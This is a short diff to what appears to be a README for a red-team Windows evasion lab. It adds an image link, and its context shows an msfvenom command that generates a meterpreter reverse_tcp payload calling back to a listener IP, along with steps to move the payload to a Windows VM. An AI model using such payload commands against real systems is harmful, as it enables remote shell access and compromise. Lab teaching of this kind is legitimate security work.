@@ -11,7 +11,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=20.40.46.181 LPORT=443 -f 
 
     Change LHOST to the IP address of your Kali Linux machine.
     Change LPORT to the listening port on your Kali Linux machine. This can be any open port on Kali Linux.
-
+![alt text](https://raw.githubusercontent.com/vaishnavucv/Project-winEvasion-Redteam/main/Resource/MSF_1.png)
 ## 3. Transfer the Payload to a Windows VM
 
 After generating the msfvenom payload for Windows 10/11 x64, transfer the payload to the testing Windows 10/11 VM using a Python HTTP server:
